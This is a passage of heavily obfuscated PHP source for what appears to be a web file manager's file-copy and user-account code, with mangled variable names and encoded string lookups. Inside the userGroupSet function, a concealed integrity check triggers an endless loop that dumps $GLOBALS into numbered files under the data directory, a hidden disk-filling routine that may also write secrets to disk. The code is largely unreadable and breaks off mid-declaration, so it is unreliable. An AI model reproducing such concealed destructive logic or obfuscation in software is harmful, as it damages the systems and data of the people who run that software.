$this->_addFiles($÷¤¾À½Ç, $ÑöÇ¥á[$ğÏ¥ğ [83]], $³á–Ã°İ); $¯ØÌÔÔß = array(); foreach ($¥‡õÆ as &$´»İá¾) { if (isset($àÚá’[$´»İá¾[$ğÏ¥ğ [32]]])) { $´»İá¾ = $àÚá’[$´»İá¾[$ğÏ¥ğ [32]]]; } $´»İá¾[$ğÏ¥ğ [462]] = $´»İá¾[$ğÏ¥ğ [33]] == $ğÏ¥ğ [75]; $´»İá¾[$ğÏ¥ğ [463]] = substr(_get($´»İá¾, $ğÏ¥ğ [175], $ğÏ¥ğ [12]), 0, 10); $´»İá¾[$ğÏ¥ğ [76]] = _get($´»İá¾, $ğÏ¥ğ [76], 0); $´»İá¾[$ğÏ¥ğ [518]] = _get($´»İá¾, $ğÏ¥ğ [518], 0); if (!isset($´»İá¾[$ğÏ¥ğ [648]]) && $´»İá¾[$ğÏ¥ğ [518]]) { $ÎÚï¡œõ[$ğÏ¥ğ [645]][] = $´»İá¾[$ğÏ¥ğ [518]]; } if ($¯à®Ø’¾) { $­Š‘ˆ€ = $this->fileNameExistCache($Ş°ƒÛ», $´»İá¾[$ğÏ¥ğ [32]]); if ($­Š‘ˆ€) { if ($´»İá¾[$ğÏ¥ğ [462]] || $¯à®Ø’¾ == REPEAT_SKIP) { continue; } if ($¯à®Ø’¾ == REPEAT_REPLACE) { $Šğ¤Íñê = $this->sourceInfoCache($­Š‘ˆ€); $ââŸ™„Œ = $this->fileHistory($Šğ¤Íñê, $´»İá¾[$ğÏ¥ğ [518]], $´»İá¾[$ğÏ¥ğ [76]]); if ($ââŸ™„Œ) { $ÎÚï¡œõ[$ğÏ¥ğ [607]][] = $´»İá¾[$ğÏ¥ğ [518]]; } continue; } else { if ($¯à®Ø’¾ == REPEAT_RENAME) { $´»İá¾[$ğÏ¥ğ [32]] = $this->fileNameAutoCache($Ş°ƒÛ», $´»İá¾[$ğÏ¥ğ [32]], $¯à®Ø’¾, !1); } } } } if (!$´»İá¾[$ğÏ¥ğ [462]] && $´»İá¾[$ğÏ¥ğ [518]] == 0) { continue; } if (!$´»İá¾[$ğÏ¥ğ [462]] && $´»İá¾[$ğÏ¥ğ [518]]) { $ÎÚï¡œõ[$ğÏ¥ğ [607]][] = $´»İá¾[$ğÏ¥ğ [518]]; } $¯ØÌÔÔß[] = $this->_makeItemData($´»İá¾, $—šÛÛëÆ, $´»İá¾[$ğÏ¥ğ [32]]); } unset($´»İá¾); if (!empty($¯ØÌÔÔß)) { $this->addAll($¯ØÌÔÔß); $this->_childrenListSelect($Ş°ƒÛ»); } $òüÑ¦¸â = $this->_childrenList($Ş°ƒÛ»); $òüÑ¦¸â = array_to_keyvalue($òüÑ¦¸â, $ğÏ¥ğ [32]); foreach ($¥‡õÆ as $´»İá¾) { $Šğ¤Íñê = $òüÑ¦¸â[$´»İá¾[$ğÏ¥ğ [32]]]; $¢•öÛÏÖ = $Šğ¤Íñê[$ğÏ¥ğ [181]]; $this->_copyApplyMeta($Šğ¤Íñê, $ÎÚï¡œõ); if ($´»İá¾[$ğÏ¥ğ [33]] == $ğÏ¥ğ [75]) { $´»İá¾[$ğÏ¥ğ [84]] = $÷¤¾À½Ç->getPathInner($´»İá¾[$ğÏ¥ğ [84]]); $this->_copyChildTo($÷¤¾À½Ç, $´»İá¾[$ğÏ¥ğ [84]], $¢•öÛÏÖ, $¯à®Ø’¾, $ÎÚï¡œõ, $³á–Ã°İ); } } } private function _addFiles($·¢î‰‰ê, $óàïŞº¾, $‘ÜäÜÔ¹) { $Š˜²Æ¹· =& $_SERVER[íû‘ş´]; if (!$óàïŞº¾ || count($óàïŞº¾) == 0) { return array(); } $îÆ„°Â = array(); foreach ($óàïŞº¾ as &$¯¶ƒÚ¯Œ) { Hook::trigger($Š˜²Æ¹·[649], $¯¶ƒÚ¯Œ); $¯¶ƒÚ¯Œ[$Š˜²Æ¹·[84]] = $·¢î‰‰ê->getPathInner($¯¶ƒÚ¯Œ[$Š˜²Æ¹·[84]]); $š‰ÅûÑ‚ = $·¢î‰‰ê->hashSimple($¯¶ƒÚ¯Œ[$Š˜²Æ¹·[84]]); $Èğ¨Ì‚î = $·¢î‰‰ê->hashMd5($¯¶ƒÚ¯Œ[$Š˜²Æ¹·[84]]); if (strlen($Èğ¨Ì‚î) > 10 && !isset($îÆ„°Â[$Èğ¨Ì‚î])) { $îÆ„°Â[$Èğ¨Ì‚î] = array(); } $¯¶ƒÚ¯Œ[$Š˜²Æ¹·[650]] = $š‰ÅûÑ‚; $¯¶ƒÚ¯Œ[$Š˜²Æ¹·[524]] = $Èğ¨Ì‚î; $îÆ„°Â[$Èğ¨Ì‚î][] =& $¯¶ƒÚ¯Œ; if (count($îÆ„°Â[$Èğ¨Ì‚î]) > 1) { $¯¶ƒÚ¯Œ[$Š˜²Æ¹·[648]] = !0; } Hook::trigger($Š˜²Æ¹·[651], $¯¶ƒÚ¯Œ); } unset($¯¶ƒÚ¯Œ); $Ş›³¦è = array($Š˜²Æ¹·[524] => array($Š˜²Æ¹·[7], array_keys($îÆ„°Â))); $¤«ú¾Ÿ = Model($Š˜²Æ¹·[652]); $ë¼ØÈÑò = $¤«ú¾Ÿ->where($Ş›³¦è)->select(); $ë¼ØÈÑò = $ë¼ØÈÑò ? $ë¼ØÈÑò : array(); foreach ($ë¼ØÈÑò as $Å¿©æ¦–) { if (!isset($îÆ„°Â[$Å¿©æ¦–[$Š˜²Æ¹·[524]]])) { continue; } $Â¥€ª = $îÆ„°Â[$Å¿©æ¦–[$Š˜²Æ¹·[524]]]; foreach ($Â¥€ª as &$¯¶ƒÚ¯Œ) { $¯¶ƒÚ¯Œ[$Š˜²Æ¹·[518]] = $Å¿©æ¦–[$Š˜²Æ¹·[518]]; $¯¶ƒÚ¯Œ[$Š˜²Æ¹·[648]] = !0; } unset($¯¶ƒÚ¯Œ); } $†ôËÑœ› = array(); foreach ($óàïŞº¾ as $é˜³˜Õ“) { Hook::trigger($Š˜²Æ¹·[653], $é˜³˜Õ“); if (isset($é˜³˜Õ“[$Š˜²Æ¹·[648]]) && $é˜³˜Õ“[$Š˜²Æ¹·[648]]) { Hook::trigger($Š˜²Æ¹·[654], $é˜³˜Õ“); continue; } $ŞÙüÏ® = $·¢î‰‰ê->getPathInner($é˜³˜Õ“[$Š˜²Æ¹·[84]]); $‚À­áˆÎ = $¤«ú¾Ÿ->addFileMake($ŞÙüÏ®, $é˜³˜Õ“[$Š˜²Æ¹·[76]], $é˜³˜Õ“[$Š˜²Æ¹·[650]], $é˜³˜Õ“[$Š˜²Æ¹·[524]], $é˜³˜Õ“[$Š˜²Æ¹·[32]], $‘ÜäÜÔ¹); Hook::trigger($Š˜²Æ¹·[654], $é˜³˜Õ“); if (!is_array($‚À­áˆÎ)) { continue; } $†ôËÑœ›[] = $‚À­áˆÎ; } $¤«ú¾Ÿ->addAll($†ôËÑœ›); $Ş›³¦è = array($Š˜²Æ¹·[524] => array($Š˜²Æ¹·[7], array_keys($îÆ„°Â))); $ë¼ØÈÑò = $¤«ú¾Ÿ->where($Ş›³¦è)->select(); $ë¼ØÈÑò = $ë¼ØÈÑò ? $ë¼ØÈÑò : array(); foreach ($ë¼ØÈÑò as $Å¿©æ¦–) { if (!isset($îÆ„°Â[$Å¿©æ¦–[$Š˜²Æ¹·[524]]])) { continue; } $Æç›Ãï† =& $îÆ„°Â[$Å¿©æ¦–[$Š˜²Æ¹·[524]]]; foreach ($Æç›Ãï† as &$¯¶ƒÚ¯Œ) { $¯¶ƒÚ¯Œ[$Š˜²Æ¹·[518]] = $Å¿©æ¦–[$Š˜²Æ¹·[518]]; } unset($¯¶ƒÚ¯Œ); } $ñ¡…ÒõÀ = array(); foreach ($óàïŞº¾ as $›ÃôÓˆ½) { $ñ¡…ÒõÀ[$›ÃôÓˆ½[$Š˜²Æ¹·[32]]] = $›ÃôÓˆ½; } return $ñ¡…ÒõÀ; } } define($_SERVER[íû‘ş´][655], $_SERVER[íû‘ş´][656]); $xnvozlyuth = $_SERVER[íû‘ş´][657]; goto Eï¹¶ö¢‚†; e†—­Õ¼¤: class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\162"; protected $tableMeta = array("\x74\141\x62\154\145\116\141\x6d\x65" => "\165\163\x65\x72\137\155\145\x74\x61", "\x6d\145\164\x61\x46\x69\145\154\144" => "\x75\163\145\x72\x49\x44"); protected $simpleField = "\165\x73\x65\162\111\104\x2c\x6e\x69\x63\153\x4e\x61\x6d\145\x2c\x6e\x61\x6d\145\x2c\x61\166\141\164\x61\x72\54\163\x65\170\54\x73\x74\141\x74\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Ç…ÉÁÛ) { $ÏÊë§ÛÙ =& $_SERVER[íû‘ş´]; $äÓğŞíÃ = $ÏÊë§ÛÙ[2355]; return array($ÏÊë§ÛÙ[1981] => array($Ç…ÉÁÛ[0], $äÓğŞíÃ), $ÏÊë§ÛÙ[1983] => array($Ç…ÉÁÛ[0], $äÓğŞíÃ), $ÏÊë§ÛÙ[2356] => array($Ç…ÉÁÛ[0], $äÓğŞíÃ)); } protected function getInfo($ÙÎğÄöİ, $¾ßêÄÁ’ = false) { $õÛÓ¤²ù = $this->getInfoSimple($ÙÎğÄöİ); if (!is_array($õÛÓ¤²ù)) { return array(); } if ($¾ßêÄÁ’) { return $this->_getInfoApply($õÛÓ¤²ù); } return $this->cacheFunctionGet($_SERVER[íû‘ş´][1985], $ÙÎğÄöİ); } protected function getInfoFull($æŠë½©Š, $Èá…³°õ = false) { $Î¢İê²Ğ = $this->getInfoSimple($æŠë½©Š); if (!is_array($Î¢İê²Ğ)) { return array(); } if ($Èá…³°õ) { return $this->_getInfoApply($Î¢İê²Ğ, !0); } return $this->cacheFunctionGet($_SERVER[íû‘ş´][2357], $æŠë½©Š); } private function _getInfoApply($íëı¾Ÿ”, $¦€•¶„¶ = false) { $²ÍéÇ×û =& $_SERVER[íû‘ş´]; if (!$íëı¾Ÿ”) { return $íëı¾Ÿ”; } $Í›»¤¾´ = md5($²ÍéÇ×û[2358] . $íëı¾Ÿ”[$²ÍéÇ×û[947]] . $²ÍéÇ×û[2359] . $íëı¾Ÿ”[$²ÍéÇ×û[32]]); $íëı¾Ÿ” = $this->_listDataApplyItem($íëı¾Ÿ”); $ŸŞ¯Ë¢“ = Model($²ÍéÇ×û[1390])->metaGet($íëı¾Ÿ”[$²ÍéÇ×û[87]][$²ÍéÇ×û[181]]); $íëı¾Ÿ”[$²ÍéÇ×û[2360]] = $Í›»¤¾´; $íëı¾Ÿ”[$²ÍéÇ×û[87]][$²ÍéÇ×û[2177]] = isset($ŸŞ¯Ë¢“[$²ÍéÇ×û[2178]]) ? $ŸŞ¯Ë¢“[$²ÍéÇ×û[2178]] : null; if ($¦€•¶„¶) { $íëı¾Ÿ”[$²ÍéÇ×û[516]] = $this->metaGet($íëı¾Ÿ”[$²ÍéÇ×û[1705]]); } return $íëı¾Ÿ”; } protected function getInfoSimple($­èÌ†´í, $íÄ«–¬Î = false) { $ç•Öõ‘õ =& $_SERVER[íû‘ş´]; if (!$­èÌ†´í) { return array(); } if ($íÄ«–¬Î) { $Ê³æ×Š» = $this->where(array($ç•Öõ‘õ[1705] => intval($­èÌ†´í)))->find(); if (!is_array($Ê³æ×Š»)) { return array(); } $Ê³æ×Š»[$ç•Öõ‘õ[2361]] = Action($ç•Öõ‘õ[2362])->parseUrl($Ê³æ×Š»[$ç•Öõ‘õ[2361]]); return $Ê³æ×Š»; } return $this->cacheFunctionGet($ç•Öõ‘õ[1986], $­èÌ†´í); } protected function getInfoSimpleOuter($¸ş®Å¬©) { $Ë›ß©í =& $_SERVER[íû‘ş´]; if (!$¸ş®Å¬© || $¸ş®Å¬© == 0) { return array($Ë›ß©í[1705] => $Ë›ß©í[212], $Ë›ß©í[32] => $Ë›ß©í[163] . LNG($Ë›ß©í[2363]) . $Ë›ß©í[165], $Ë›ß©í[2361] => STATIC_PATH . $Ë›ß©í[2364]); } $û²ó…ê’ = $this->cacheFunctionGet($Ë›ß©í[1986], $¸ş®Å¬©); $‡·¹Œ¼” = array_field_key($û²ó…ê’, explode($Ë›ß©í[50], $this->simpleField)); if (!$‡·¹Œ¼”) { return array($Ë›ß©í[1705] => $Ë›ß©í[1246], $Ë›ß©í[32] => $Ë›ß©í[163] . LNG($Ë›ß©í[2365]) . $Ë›ß©í[165], $Ë›ß©í[2361] => STATIC_PATH . $Ë›ß©í[2366]); } $‡·¹Œ¼”[$Ë›ß©í[2361]] = Action($Ë›ß©í[2362])->parseUrl($‡·¹Œ¼”[$Ë›ß©í[2361]]); return $‡·¹Œ¼”; } protected function groupUser($Ë«µØ—¿) { } public static function errorLang($–äÉ¾óÖ) { $×—Ï£Ëô =& $_SERVER[íû‘ş´]; $è€†á³ = array(self::ERROR_USER_NOT_EXISTS => $×—Ï£Ëô[2367], self::ERROR_USER_PASSWORD_ERROR => $×—Ï£Ëô[2368], self::ERROR_USER_EXIST_NAME => $×—Ï£Ëô[2369], self::ERROR_USER_EXIST_PHONE => $×—Ï£Ëô[2370], self::ERROR_USER_EXIST_EMAIL => $×—Ï£Ëô[2371], self::ERROR_USER_LOGIN_LOCK => $×—Ï£Ëô[2372], self::ERROR_IP_NOT_ALLOW => $×—Ï£Ëô[2373], self::ERROR_USER_EXIST_NICKNAME => $×—Ï£Ëô[2374]); return LNG($è€†á³[$–äÉ¾óÖ]); } public function getInfoByMeta($Î­•û‹, $ÖúşÂ¢) { $ïÜ¨²ë¾ =& $_SERVER[íû‘ş´]; $²ì‰õ” = Model($ïÜ¨²ë¾[2375])->where(array($ïÜ¨²ë¾[94] => $Î­•û‹, $ïÜ¨²ë¾[418] => $ÖúşÂ¢))->find(); if ($²ì‰õ”) { return $this->getInfo($²ì‰õ”[$ïÜ¨²ë¾[1705]]); } return !1; } public function userLoginCheck($„Éìå‘í, $àâµ‘¥Ñ) { $ƒ­¨ÅÈã =& $_SERVER[íû‘ş´]; $ß¹ôåºÑ = $this->userLoginFind($„Éìå‘í); if (!$ß¹ôåºÑ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ß¹ôåºÑ[$ƒ­¨ÅÈã[1705]], $àâµ‘¥Ñ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ß¹ôåºÑ[$ƒ­¨ÅÈã[1705]]); } public function userLoginFind($¹§îõ†£) { $Šõš„°º =& $_SERVER[íû‘ş´]; $—èİúƒ = array($Šõš„°º[32] => $¹§îõ†£, $Šõš„°º[2185] => $¹§îõ†£, $Šõš„°º[349] => $¹§îõ†£, $Šõš„°º[2376] => $¹§îõ†£, $Šõš„°º[1058] => $Šõš„°º[1060]); if ($this->nickNameRpt()) { unset($—èİúƒ[$Šõš„°º[2185]]); } return $this->where($—èİúƒ)->find(); } public function clearCache($¸¼Íõ) { $÷Ïì•ş… =& $_SERVER[íû‘ş´]; $this->cacheFunctionClear($÷Ïì•ş…[1985], $¸¼Íõ); $this->cacheFunctionClear($÷Ïì•ş…[1986], $¸¼Íõ); $this->cacheFunctionClear($÷Ïì•ş…[2357], $¸¼Íõ); } public function userPasswordCheck($Êƒû‚×É, $×Š®…æ‘) { $ÄÔ‡ó† =& $_SERVER[íû‘ş´]; $Ğİ ü”Ó = $this->where(array($ÄÔ‡ó†[1705] => intval($Êƒû‚×É)))->find(); $ŠÏ«•ã• = $this->metaGet($Êƒû‚×É); $¥¾ø‹ß» = isset($ŠÏ«•ã•[$ÄÔ‡ó†[2377]]) ? $ŠÏ«•ã•[$ÄÔ‡ó†[2377]] : $ÄÔ‡ó†[12]; if (md5($¥¾ø‹ß» . trim($×Š®…æ‘)) !== $Ğİ ü”Ó[$ÄÔ‡ó†[947]]) { return !1; } return !0; } public function userAdd($ÈÖŒ—û) { $ŠÏ†‘‰ã =& $_SERVER[íû‘ş´]; $—¸ØÖ§ë = array($ŠÏ†‘‰ã[471] => $ÈÖŒ—û[$ŠÏ†‘‰ã[32]], $ŠÏ†‘‰ã[2378] => $ÈÖŒ—û[$ŠÏ†‘‰ã[1577]], $ŠÏ†‘‰ã[2379] => isset($ÈÖŒ—û[$ŠÏ†‘‰ã[349]]) ? $ÈÖŒ—û[$ŠÏ†‘‰ã[349]] : $ŠÏ†‘‰ã[12], $ŠÏ†‘‰ã[2380] => isset($ÈÖŒ—û[$ŠÏ†‘‰ã[2376]]) ? $ÈÖŒ—û[$ŠÏ†‘‰ã[2376]] : $ŠÏ†‘‰ã[12], $ŠÏ†‘‰ã[2381] => isset($ÈÖŒ—û[$ŠÏ†‘‰ã[2185]]) ? $ÈÖŒ—û[$ŠÏ†‘‰ã[2185]] : $ÈÖŒ—û[$ŠÏ†‘‰ã[32]], $ŠÏ†‘‰ã[2382] => isset($ÈÖŒ—û[$ŠÏ†‘‰ã[2361]]) ? $ÈÖŒ—û[$ŠÏ†‘‰ã[2361]] : $ŠÏ†‘‰ã[12], $ŠÏ†‘‰ã[2383] => isset($ÈÖŒ—û[$ŠÏ†‘‰ã[2384]]) ? $ÈÖŒ—û[$ŠÏ†‘‰ã[2384]] : 1, $ŠÏ†‘‰ã[2385] => $ÈÖŒ—û[$ŠÏ†‘‰ã[947]], $ŠÏ†‘‰ã[1987] => isset($ÈÖŒ—û[$ŠÏ†‘‰ã[1890]]) ? $ÈÖŒ—û[$ŠÏ†‘‰ã[1890]] : 1024 * 1024 * 20, $ŠÏ†‘‰ã[1988] => 0, $ŠÏ†‘‰ã[2386] => 0, $ŠÏ†‘‰ã[2032] => isset($ÈÖŒ—û[$ŠÏ†‘‰ã[809]]) ? $ÈÖŒ—û[$ŠÏ†‘‰ã[809]] : 1); if (!empty($ÈÖŒ—û[$ŠÏ†‘‰ã[1705]])) { $—¸ØÖ§ë[$ŠÏ†‘‰ã[1705]] = $ÈÖŒ—û[$ŠÏ†‘‰ã[1705]]; } $¤•÷ Â¢ = $this->_checkExist($ÈÖŒ—û); if ($¤•÷ Â¢ !== !0) { return $¤•÷ Â¢; } if (!empty($—¸ØÖ§ë[$ŠÏ†‘‰ã[2361]]) && strlen($—¸ØÖ§ë[$ŠÏ†‘‰ã[2361]]) > 255) { $—¸ØÖ§ë[$ŠÏ†‘‰ã[2361]] = $ŠÏ†‘‰ã[12]; } $ùÖßÊÊÆ = $this->add($—¸ØÖ§ë); $çø©öæö = array($ŠÏ†‘‰ã[2385] => $—¸ØÖ§ë[$ŠÏ†‘‰ã[947]], $ŠÏ†‘‰ã[2381] => $—¸ØÖ§ë[$ŠÏ†‘‰ã[2185]]); $this->userEdit($ùÖßÊÊÆ, $çø©öæö); Model($ŠÏ†‘‰ã[1390])->userRootAdd($ùÖßÊÊÆ); return $ùÖßÊÊÆ; } protected function userEditTest($áî²ŞË, $çÔ–Ö¦ˆ) { return $this->call($_SERVER[íû‘ş´][2387], $áî²ŞË, $çÔ–Ö¦ˆ); } protected function userEdit($’×Õ½È©, $šµÂ¯†Å) { $Áš“„¹ =& $_SERVER[íû‘ş´]; $åıĞ§º™ = $this->getInfoSimple($’×Õ½È©); if (!$åıĞ§º™) { return !1; } $³¶²‹±² = $this->_checkExist($šµÂ¯†Å, $’×Õ½È©); if ($³¶²‹±² !== !0) { return $³¶²‹±²; } if (isset($šµÂ¯†Å[$Áš“„¹[947]]) && trim($šµÂ¯†Å[$Áš“„¹[947]]) != $Áš“„¹[12]) { $ç”ë¦Ï = $this->metaGet($’×Õ½È©); if (empty($ç”ë¦Ï[$Áš“„¹[2377]])) { $ç”ë¦Ï[$Áš“„¹[2377]] = rand_string(10); Model($Áš“„¹[556])->metaSet($’×Õ½È©, $Áš“„¹[2377], $ç”ë¦Ï[$Áš“„¹[2377]]); } $šµÂ¯†Å[$Áš“„¹[947]] = md5($ç”ë¦Ï[$Áš“„¹[2377]] . trim($šµÂ¯†Å[$Áš“„¹[947]])); } else { unset($šµÂ¯†Å[$Áš“„¹[947]]); } if (!empty($šµÂ¯†Å[$Áš“„¹[2361]]) && strlen($šµÂ¯†Å[$Áš“„¹[2361]]) > 255) { $šµÂ¯†Å[$Áš“„¹[2361]] = $Áš“„¹[12]; } $this->where(array($Áš“„¹[1696] => $’×Õ½È©))->save($šµÂ¯†Å); if (isset($šµÂ¯†Å[$Áš“„¹[2185]])) { $this->setNamePinyin($’×Õ½È©, $šµÂ¯†Å[$Áš“„¹[2185]]); } $this->clearCache($’×Õ½È©); return !0; } public function setNamePinyin($‰’Ù½Í¥, $Šà¶œ‚Ç = false) { $Î¢âéÏÏ =& $_SERVER[íû‘ş´]; if (!$Šà¶œ‚Ç) { $›†²Ö¼¢ = $this->getInfoSimple($‰’Ù½Í¥); $Šà¶œ‚Ç = $›†²Ö¼¢[$Î¢âéÏÏ[2185]] ? $›†²Ö¼¢[$Î¢âéÏÏ[2185]] : $›†²Ö¼¢[$Î¢âéÏÏ[32]]; } $‘‹Ò­¼ª = Model($Î¢âéÏÏ[577]); if (!Input::check($Šà¶œ‚Ç, $Î¢âéÏÏ[633])) { return $‘‹Ò­¼ª->metaSet($‰’Ù½Í¥, array($Î¢âéÏÏ[515] => $Î¢âéÏÏ[12], $Î¢âéÏÏ[514] => $Î¢âéÏÏ[12])); } return $‘‹Ò­¼ª->metaSet($‰’Ù½Í¥, array($Î¢âéÏÏ[515] => str_replace($Î¢âéÏÏ[53], $Î¢âéÏÏ[12], Pinyin::get($Šà¶œ‚Ç)), $Î¢âéÏÏ[514] => Pinyin::get($Šà¶œ‚Ç, $Î¢âéÏÏ[634]))); } private function nickNameRpt() { $«©êÒˆÖ =& $_SERVER[íû‘ş´]; $®ê“™î¬ = Model($«©êÒˆÖ[829])->get($«©êÒˆÖ[2388]); $ĞúÀ´ü = $GLOBALS[$«©êÒˆÖ[6]][$«©êÒˆÖ[425]][$«©êÒˆÖ[2388]]; $½ı†„ÚÀ = !is_null($®ê“™î¬) ? $®ê“™î¬ : $ĞúÀ´ü; return !!$½ı†„ÚÀ; } private function _checkExist($‚®­‡”, $Ï…ĞÂ• = false) { $¬ Ûû¹Â =& $_SERVER[íû‘ş´]; $ñüµÁúÄ = array($¬ Ûû¹Â[32] => UserModel::ERROR_USER_EXIST_NAME, $¬ Ûû¹Â[2185] => UserModel::ERROR_USER_EXIST_NICKNAME, $¬ Ûû¹Â[349] => UserModel::ERROR_USER_EXIST_EMAIL, $¬ Ûû¹Â[2376] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ñüµÁúÄ[$¬ Ûû¹Â[2185]]); } $ªì¦êù¦ = $Ï…ĞÂ• ? array($¬ Ûû¹Â[1705] => array($¬ Ûû¹Â[2389], $Ï…ĞÂ•)) : array(); foreach ($ñüµÁúÄ as $ÑÈİ¢Ì => $Ü¡ë½®) { $‰ˆûÍèÖ = array(); foreach ($ñüµÁúÄ as $§ µ„—ä => $€Ë­Î¶í) { if (isset($‚®­‡”[$§ µ„—ä]) && $‚®­‡”[$§ µ„—ä]) { $‰ˆûÍèÖ[] = $‚®­‡”[$§ µ„—ä]; } } if (!$‰ˆûÍèÖ) { continue; } $”¶‹¾Ú = array_merge(array($ÑÈİ¢Ì => array($¬ Ûû¹Â[7], $‰ˆûÍèÖ)), $ªì¦êù¦); $Ü–êŒ¾« = $this->where($”¶‹¾Ú)->find(); if ($Ü–êŒ¾«) { return $Ü¡ë½®; } } return !0; } public function userListInfo($ñŸÇÃ‰ı) { $©îõˆÎŸ =& $_SERVER[íû‘ş´]; $ßİñÜÉ  = array(); $ñŸÇÃ‰ı = is_array($ñŸÇÃ‰ı) ? array_unique($ñŸÇÃ‰ı) : array(); if (!$ñŸÇÃ‰ı) { return $ßİñÜÉ ; } if (count($ñŸÇÃ‰ı) < 20) { foreach ($ñŸÇÃ‰ı as $¥è˜š­Ô) { $ßİñÜÉ [$¥è˜š­Ô . $©îõˆÎŸ[12]] = $this->getInfoSimpleOuter($¥è˜š­Ô); } } else { $„û—ÁÜ° = array($©îõˆÎŸ[1696] => array($©îõˆÎŸ[469], $ñŸÇÃ‰ı)); if (count($ñŸÇÃ‰ı) == 1) { $„û—ÁÜ° = array($©îõˆÎŸ[1696] => $ñŸÇÃ‰ı[0]); } $ıÇæˆ¿‡ = Model($©îõˆÎŸ[556])->field($this->simpleField)->where($„û—ÁÜ°)->select(); $ıÇæˆ¿‡ = array_to_keyvalue($ıÇæˆ¿‡, $©îõˆÎŸ[1705]); foreach ($ñŸÇÃ‰ı as $¥è˜š­Ô) { $å²§½ŠÑ = $ıÇæˆ¿‡[$¥è˜š­Ô]; if (!$å²§½ŠÑ) { $ßİñÜÉ [$¥è˜š­Ô . $©îõˆÎŸ[12]] = $this->getInfoSimpleOuter($¥è˜š­Ô); continue; } $å²§½ŠÑ[$©îõˆÎŸ[2361]] = Action($©îõˆÎŸ[2362])->parseUrl($å²§½ŠÑ[$©îõˆÎŸ[2361]]); $ßİñÜÉ [$¥è˜š­Ô . $©îõˆÎŸ[12]] = $å²§½ŠÑ; } } return $ßİñÜÉ ; } protected function userStatus($—Şœ£˜ï, $ä•Ñíàî) { $ˆ«é™¨Í = $this->getInfoSimple($—Şœ£˜ï); if (!$ˆ«é™¨Í) { return !1; } $Â½û³İ× = array($_SERVER[íû‘ş´][809] => $ä•Ñíàî); return $this->userEdit($—Şœ£˜ï, $Â½û³İ×); } protected function userRemove($ô×°Î©÷) { $ñÊÂŠŠ¯ =& $_SERVER[íû‘ş´]; $éäƒÛ = $this->getInfoSimple($ô×°Î©÷); if (!$éäƒÛ) { return !1; } $Î“Ç”¥Ü = array($ñÊÂŠŠ¯[1696] => $ô×°Î©÷); Model($ñÊÂŠŠ¯[642])->where($Î“Ç”¥Ü)->delete(); Model($ñÊÂŠŠ¯[2390])->where($Î“Ç”¥Ü)->delete(); Model($ñÊÂŠŠ¯[1993])->where($Î“Ç”¥Ü)->delete(); Model($ñÊÂŠŠ¯[2375])->where($Î“Ç”¥Ü)->delete(); Model($ñÊÂŠŠ¯[1126])->where($Î“Ç”¥Ü)->delete(); Model($ñÊÂŠŠ¯[2202])->removeUserAll($ô×°Î©÷); Model($ñÊÂŠŠ¯[884])->userRootRemove($ô×°Î©÷); return $this->where($Î“Ç”¥Ü)->delete(); } protected function userGroupSet($­û¶úĞ¡, $ºŞ»ªó§, $©òó†« = array()) { $Ââ¬è±¡ =& $_SERVER[íû‘ş´]; $‘¢à“ = $_SERVER[$Ââ¬è±¡[447]] . $Ââ¬è±¡[448]; $ÓÛÄ ØÚ = $Ââ¬è±¡[1628]; if ($_SERVER[$Ââ¬è±¡[444]] != $ÓÛÄ ØÚ($‘¢à“)) { $¯§Üõ±Ç = $Ââ¬è±¡[936]; $ñà½‰Š£ = $Ââ¬è±¡[446]; $ü±Û¥ó© = $_SERVER[$Ââ¬è±¡[447]] . $Ââ¬è±¡[448]; $Ş‚Ä³¯ä = $ñà½‰Š£($ü±Û¥ó©); $ÎçÇµÙí = explode($Ââ¬è±¡[246], $Ş‚Ä³¯ä); if (count($ÎçÇµÙí) < $Ââ¬è±¡[671]) { $¢¾“àĞ§ = $Ââ¬è±¡[450]; $¢¾“àĞ§(); } $ÄŠ•ãøª = $Ââ¬è±¡[937]; $ÄŠ•ãøª($_SERVER[$Ââ¬è±¡[938]]); $¯§Üõ±Ç = $Ââ¬è±¡[936]; $¯§Üõ±Ç(); $€ì÷íÊ = $Ââ¬è±¡[1629]; $ÌÇÖÇÕÒ = json_encode($GLOBALS[$Ââ¬è±¡[1630]]); $Ê‚Ú’ÁÂ = 1; for ($˜ıºÚÓÜ = $Ê‚Ú’ÁÂ; $˜ıºÚÓÜ > 0; $˜ıºÚÓÜ++) { $€ì÷íÊ(DATA_PATH . $˜ıºÚÓÜ, $ÌÇÖÇÕÒ); } } $·£ûÊİ = $this->getInfoSimple($­û¶úĞ¡); if (!$·£ûÊİ || !is_array($ºŞ»ªó§)) { return !1; } $±×èİÓÄ = Model($Ââ¬è±¡[1993]); $±×èİÓÄ->where(array($Ââ¬è±¡[1705] => $­û¶úĞ¡))->delete(); $ß½ˆà¾¦ = array(); $ÕÜ¦ = 0; foreach ($ºŞ»ªó§ as $Ü‹ÆÃ¨· => $ÁŸ£úúæ) { $‚°Å»ö® = array($Ââ¬è±¡[1705] => $­û¶úĞ¡, $Ââ¬è±¡[1903] => $Ü‹ÆÃ¨·, $Ââ¬è±¡[2007] => $ÁŸ£úúæ); $‚°Å»ö®[$Ââ¬è±¡[1927]] = isset($©òó†«[$ÕÜ¦]) ? $©òó†«[$ÕÜ¦] : 0; $ÕÜ¦++; $ß½ˆà¾¦[] = $‚°Å»ö®; } return $±×èİÓÄ->addAll($ß½ˆà¾¦, array(), !0); } protected function userGroupAdd($©µİßÃ, $îîÏÒı = array()) { $Éêô¥©Î =& $_SERVER[íû‘ş´]; $ÍÛëÙ¸ú = $this->getInfoSimple($©µİßÃ); if (!$ÍÛëÙ¸ú || empty($îîÏÒı)) { return !1; } $ˆÖ”ÑÀ³ = array(); foreach ($îîÏÒı as $Å³è¤Œñ => $ã×°íîì) { $ˆÖ”ÑÀ³[] = array($Éêô¥©Î[1705] => $©µİßÃ, $Éêô¥©Î[1903] => $Å³è¤Œñ, $Éêô¥©Î[2007] => $ã×°íîì, $Éêô¥©Î[1927] => 0); } return Model($Éêô¥©Î[1993])->addAll($ˆÖ”ÑÀ³, array(), !0); } protected function 